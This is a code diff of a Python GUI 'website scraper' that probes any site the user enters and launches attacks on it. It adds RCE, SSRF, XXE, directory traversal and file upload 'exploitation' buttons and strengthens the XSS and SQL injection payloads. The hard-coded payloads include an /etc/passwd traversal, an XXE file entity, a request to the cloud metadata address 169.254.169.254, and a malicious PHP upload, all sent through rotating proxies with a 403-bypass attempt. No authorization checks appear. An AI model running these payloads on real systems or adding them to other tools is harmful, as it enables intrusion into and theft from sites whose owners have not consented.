@@ -282,18 +282,15 @@ class WebsiteScraper:
             elif href.endswith('.env') or href.endswith('.json') or href.endswith('.yaml') or href.endswith('.yml'):
                 urls['config'].append(urljoin(base_url, href))
                 
-        # Detect API endpoints
         for tag in soup.find_all('a', href=True):
             href = tag['href']
             if href.startswith('/api/') or href.startswith('/v1/') or href.startswith('/v2/') or href.startswith('/v3/'):
                 urls['api'].append(urljoin(base_url, href))
         
-        # Detect manifest.json
         for tag in soup.find_all('link', href=True):
             if tag.get('rel') == ['manifest']:
                 urls['manifest'].append(urljoin(base_url, tag['href']))
         
-        # Detect license files referenced in comments
         for tag in soup.find_all('script', src=True):
             js_url = urljoin(base_url, tag['src'])
             js_response = self.session.get(js_url, proxies=self.get_proxy())
@@ -423,7 +420,6 @@ class WebsiteScraper:
         try:
             response = self.session.get(url, timeout=10, proxies=self.get_proxy())
             if response.status_code == 403:
-                # Try different headers to bypass 403
                 headers = {
                     'User-Agent': self.user_agent.random,
                     'Referer': self.base_url,
@@ -483,7 +479,6 @@ class WebsiteScraper:
             response = self.session.get(url, params={'q': payload}, proxies=self.get_proxy())
             if payload in response.text:
                 print(f"XSS vulnerability detected at {url}")
-                self.exploit_xss(url, payload)
                 return True
             else:
                 print(f"No XSS vulnerability detected at {url}")
@@ -495,7 +490,7 @@ class WebsiteScraper:
     def exploit_xss(self, url: str, payload: str):
         try:
             response = self.session.get(url, params={'q': payload}, proxies=self.get_proxy())
-            if response.status_code == 200:
+            if response.status_code == 200 and payload in response.text:
                 print(f"XSS exploit successful at {url}")
             else:
                 print(f"XSS exploit failed at {url}: Status code {response.status_code}")
@@ -507,7 +502,6 @@ class WebsiteScraper:
             response = self.session.get(url, params={'id': payload}, proxies=self.get_proxy())
             if "error in your SQL syntax" in response.text:
                 print(f"SQL injection vulnerability detected at {url}")
-                self.exploit_sql_injection(url, payload)
                 return True
             else:
                 print(f"No SQL injection vulnerability detected at {url}")
@@ -519,7 +513,7 @@ class WebsiteScraper:
     def exploit_sql_injection(self, url: str, payload: str):
         try:
             response = self.session.get(url, params={'id': payload}, proxies=self.get_proxy())
-            if response.status_code == 200:
+            if response.status_code == 200 and "error in your SQL syntax" in response.text:
                 print(f"SQL injection exploit successful at {url}")
             else:
                 print(f"SQL injection exploit failed at {url}: Status code {response.status_code}")
@@ -531,7 +525,6 @@ class WebsiteScraper:
             response = self.session.get(url, params={'file': payload}, proxies=self.get_proxy())
             if "root:x:" in response.text:
                 print(f"Directory traversal vulnerability detected at {url}")
-                self.exploit_directory_traversal(url, payload)
                 return True
             else:
                 print(f"No directory traversal vulnerability detected at {url}")
@@ -543,7 +536,7 @@ class WebsiteScraper:
     def exploit_directory_traversal(self, url: str, payload: str):
         try:
             response = self.session.get(url, params={'file': payload}, proxies=self.get_proxy())
-            if response.status_code == 200:
+            if response.status_code == 200 and "root:x:" in response.text:
                 print(f"Directory traversal exploit successful at {url}")
             else:
                 print(f"Directory traversal exploit failed at {url}: Status code {response.status_code}")
@@ -555,7 +548,6 @@ class WebsiteScraper:
             response = self.session.post(url, data={'csrf_token': payload}, proxies=self.get_proxy())
             if response.status_code == 200:
                 print(f"CSRF vulnerability detected at {url}")
-                self.exploit_csrf(url, payload)
                 return True
             else:
                 print(f"No CSRF vulnerability detected at {url}")
@@ -581,7 +573,6 @@ class WebsiteScraper:
                 response = self.session.post(url, files=files, proxies=self.get_proxy())
             if response.status_code == 200:
                 print(f"File upload vulnerability detected at {url}")
-                self.exploit_file_upload(url, file_path)
                 return True
             else:
                 print(f"No file upload vulnerability detected at {url}")
@@ -601,6 +592,75 @@ class WebsiteScraper:
                 print(f"File upload exploit failed at {url}: Status code {response.status_code}")
         except requests.exceptions.RequestException as e:
             print(f"Error exploiting file upload at {url}: {e}")
+
+    def test_rce(self, url: str, payload: str) -> bool:
+        try:
+            response = self.session.get(url, params={'cmd': payload}, proxies=self.get_proxy())
+            if response.status_code == 200 and "root:x:" in response.text:
+                print(f"Remote code execution vulnerability detected at {url}")
+                return True
+            else:
+                print(f"No remote code execution vulnerability detected at {url}")
+                return False
+        except requests.exceptions.RequestException as e:
+            print(f"Error testing remote code execution at {url}: {e}")
+            return False
+
+    def exploit_rce(self, url: str, payload: str):
+        try:
+            response = self.session.get(url, params={'cmd': payload}, proxies=self.get_proxy())
+            if response.status_code == 200 and "root:x:" in response.text:
+                print(f"Remote code execution exploit successful at {url}")
+            else:
+                print(f"Remote code execution exploit failed at {url}: Status code {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Error exploiting remote code execution at {url}: {e}")
+
+    def test_ssrf(self, url: str, payload: str) -> bool:
+        try:
+            response = self.session.get(url, params={'url': payload}, proxies=self.get_proxy())
+            if response.status_code == 200 and "root:x:" in response.text:
+                print(f"Server-side request forgery vulnerability detected at {url}")
+                return True
+            else:
+                print(f"No server-side request forgery vulnerability detected at {url}")
+                return False
+        except requests.exceptions.RequestException as e:
+            print(f"Error testing server-side request forgery at {url}: {e}")
+            return False
+
+    def exploit_ssrf(self, url: str, payload: str):
+        try:
+            response = self.session.get(url, params={'url': payload}, proxies=self.get_proxy())
+            if response.status_code == 200 and "root:x:" in response.text:
+                print(f"Server-side request forgery exploit successful at {url}")
+            else:
+                print(f"Server-side request forgery exploit failed at {url}: Status code {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Error exploiting server-side request forgery at {url}: {e}")
+
+    def test_xxe(self, url: str, payload: str) -> bool:
+        try:
+            response = self.session.post(url, data=payload, proxies=self.get_proxy())
+            if response.status_code == 200 and "root:x:" in response.text:
+                print(f"XML external entity vulnerability detected at {url}")
+                return True
+            else:
+                print(f"No XML external entity vulnerability detected at {url}")
+                return False
+        except requests.exceptions.RequestException as e:
+            print(f"Error testing XML external entity at {url}: {e}")
+            return False
+
+    def exploit_xxe(self, url: str, payload: str):
+        try:
+            response = self.session.post(url, data=payload, proxies=self.get_proxy())
+            if response.status_code == 200 and "root:x:" in response.text:
+                print(f"XML external entity exploit successful at {url}")
+            else:
+                print(f"XML external entity exploit failed at {url}: Status code {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Error exploiting XML external entity at {url}: {e}")
 
 class ScraperUI:
     def __init__(self, root):
@@ -624,6 +684,11 @@ class ScraperUI:
         self.xss_check_var = tk.BooleanVar()
         self.sql_check_var = tk.BooleanVar()
         self.csrf_check_var = tk.BooleanVar()
+        self.dir_traversal_check_var = tk.BooleanVar()
+        self.file_upload_check_var = tk.BooleanVar()
+        self.rce_check_var = tk.BooleanVar()
+        self.ssrf_check_var = tk.BooleanVar()
+        self.xxe_check_var = tk.BooleanVar()
         
         self.scrape_data_check = ttk.Checkbutton(root, text="Scrape Data", variable=self.scrape_data_var)
         self.scrape_data_check.pack(pady=5)
@@ -636,6 +701,21 @@ class ScraperUI:
         
         self.csrf_check = ttk.Checkbutton(root, text="CSRF Check", variable=self.csrf_check_var)
         self.csrf_check.pack(pady=5)
+        
+        self.dir_traversal_check = ttk.Checkbutton(root, text="Directory Traversal Check", variable=self.dir_traversal_check_var)
+        self.dir_traversal_check.pack(pady=5)
+        
+        self.file_upload_check = ttk.Checkbutton(root, text="File Upload Check", variable=self.file_upload_check_var)
+        self.file_upload_check.pack(pady=5)
+        
+        self.rce_check = ttk.Checkbutton(root, text="Remote Code Execution Check", variable=self.rce_check_var)
+        self.rce_check.pack(pady=5)
+        
+        self.ssrf_check = ttk.Checkbutton(root, text="Server-Side Request Forgery Check", variable=self.ssrf_check_var)
+        self.ssrf_check.pack(pady=5)
+        
+        self.xxe_check = ttk.Checkbutton(root, text="XML External Entity Check", variable=self.xxe_check_var)
+        self.xxe_check.pack(pady=5)
         
         self.exploit_frame = ttk.Frame(root)
         self.exploit_frame.pack(pady=10)
@@ -654,6 +734,15 @@ class ScraperUI:
         
         self.file_upload_exploit_button = ttk.Button(self.exploit_frame, text="File Upload Exploitation", command=self.exploit_file_upload)
         self.file_upload_exploit_button.pack(side=tk.LEFT, padx=5)
+        
+        self.rce_exploit_button = ttk.Button(self.exploit_frame, text="Remote Code Execution Exploitation", command=self.exploit_rce)
+        self.rce_exploit_button.pack(side=tk.LEFT, padx=5)
+        
+        self.ssrf_exploit_button = ttk.Button(self.exploit_frame, text="Server-Side Request Forgery Exploitation", command=self.exploit_ssrf)
+        self.ssrf_exploit_button.pack(side=tk.LEFT, padx=5)
+        
+        self.xxe_exploit_button = ttk.Button(self.exploit_frame, text="XML External Entity Exploitation", command=self.exploit_xxe)
+        self.xxe_exploit_button.pack(side=tk.LEFT, padx=5)
         
         self.scrape_button = ttk.Button(root, text="Start Scraping", command=self.start_scraping)
         self.scrape_button.pack(pady=10)
@@ -690,16 +779,52 @@ class ScraperUI:
                 self.output_text.insert(tk.END, f"Total files downloaded: {len(scraper.visited_urls)}\n")
             
             if self.xss_check_var.get():
-                xss_result = scraper.test_xss(website_url, "<script>alert('XSS')</script>")
+                xss_result = scraper.test_xss(website_url, "<script>alert(document.cookie)</script>")
                 self.output_text.insert(tk.END, f"XSS Check: {'Vulnerable' if xss_result else 'Not Vulnerable'}\n")
+                if xss_result:
+                    scraper.exploit_xss(website_url, "<script>alert(document.cookie)</script>")
             
             if self.sql_check_var.get():
-                sql_result = scraper.test_sql_injection(website_url, "1' OR '1'='1")
+                sql_result = scraper.test_sql_injection(website_url, "1' OR '1'='1' --")
                 self.output_text.insert(tk.END, f"SQL Check: {'Vulnerable' if sql_result else 'Not Vulnerable'}\n")
+                if sql_result:
+                    scraper.exploit_sql_injection(website_url, "1' OR '1'='1' --")
             
             if self.csrf_check_var.get():
                 csrf_result = scraper.test_csrf(website_url, "invalid_csrf_token")
                 self.output_text.insert(tk.END, f"CSRF Check: {'Vulnerable' if csrf_result else 'Not Vulnerable'}\n")
+                if csrf_result:
+                    scraper.exploit_csrf(website_url, "invalid_csrf_token")
+            
+            if self.dir_traversal_check_var.get():
+                dir_traversal_result = scraper.test_directory_traversal(website_url, "../../../../etc/passwd")
+                self.output_text.insert(tk.END, f"Directory Traversal Check: {'Vulnerable' if dir_traversal_result else 'Not Vulnerable'}\n")
+                if dir_traversal_result:
+                    scraper.exploit_directory_traversal(website_url, "../../../../etc/passwd")
+            
+            if self.file_upload_check_var.get():
+                file_upload_result = scraper.test_file_upload(website_url, "malicious_file.php")
+                self.output_text.insert(tk.END, f"File Upload Check: {'Vulnerable' if file_upload_result else 'Not Vulnerable'}\n")
+                if file_upload_result:
+                    scraper.exploit_file_upload(website_url, "malicious_file.php")
+            
+            if self.rce_check_var.get():
+                rce_result = scraper.test_rce(website_url, "id")
+                self.output_text.insert(tk.END, f"Remote Code Execution Check: {'Vulnerable' if rce_result else 'Not Vulnerable'}\n")
+                if rce_result:
+                    scraper.exploit_rce(website_url, "id")
+            
+            if self.ssrf_check_var.get():
+                ssrf_result = scraper.test_ssrf(website_url, "http://169.254.169.254/latest/meta-data/")
+                self.output_text.insert(tk.END, f"Server-Side Request Forgery Check: {'Vulnerable' if ssrf_result else 'Not Vulnerable'}\n")
+                if ssrf_result:
+                    scraper.exploit_ssrf(website_url, "http://169.254.169.254/latest/meta-data/")
+            
+            if self.xxe_check_var.get():
+                xxe_result = scraper.test_xxe(website_url, '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>')
+                self.output_text.insert(tk.END, f"XML External Entity Check: {'Vulnerable' if xxe_result else 'Not Vulnerable'}\n")
+                if xxe_result:
+                    scraper.exploit_xxe(website_url, '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>')
             
         except Exception as e:
             self.output_text.insert(tk.END, f"Error: {e}\n")
@@ -710,7 +835,7 @@ class ScraperUI:
             messagebox.showerror("Error", "Please enter a website URL.")
             return
         scraper = WebsiteScraper(website_url, "output_directory")
-        scraper.exploit_xss(website_url, "<script>alert('XSS')</script>")
+        scraper.exploit_xss(website_url, "<script>alert(document.cookie)</script>")
 
     def exploit_sql_injection(self):
         website_url = self.url_entry.get()
@@ -718,7 +843,7 @@ class ScraperUI:
             messagebox.showerror("Error", "Please enter a website URL.")
             return
         scraper = WebsiteScraper(website_url, "output_directory")
-        scraper.exploit_sql_injection(website_url, "1' OR '1'='1")
+        scraper.exploit_sql_injection(website_url, "1' OR '1'='1' --")
 
     def exploit_csrf(self):
         website_url = self.url_entry.get()
@@ -743,6 +868,30 @@ class ScraperUI:
             return
         scraper = WebsiteScraper(website_url, "output_directory")
         scraper.exploit_file_upload(website_url, "malicious_file.php")
+
+    def exploit_rce(self):
+        website_url = self.url_entry.get()
+        if not website_url:
+            messagebox.showerror("Error", "Please enter a website URL.")
+            return
+        scraper = WebsiteScraper(website_url, "output_directory")
+        scraper.exploit_rce(website_url, "id")
+
+    def exploit_ssrf(self):
+        website_url = self.url_entry.get()
+        if not website_url:
+            messagebox.showerror("Error", "Please enter a website URL.")
+            return
+        scraper = WebsiteScraper(website_url, "output_directory")
+        scraper.exploit_ssrf(website_url, "http://169.254.169.254/latest/meta-data/")
+
+    def exploit_xxe(self):
+        website_url = self.url_entry.get()
+        if not website_url:
+            messagebox.showerror("Error", "Please enter a website URL.")
+            return
+        scraper = WebsiteScraper(website_url, "output_directory")
+        scraper.exploit_xxe(website_url, '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>')
 
 if __name__ == "__main__":
     root = tk.Tk()
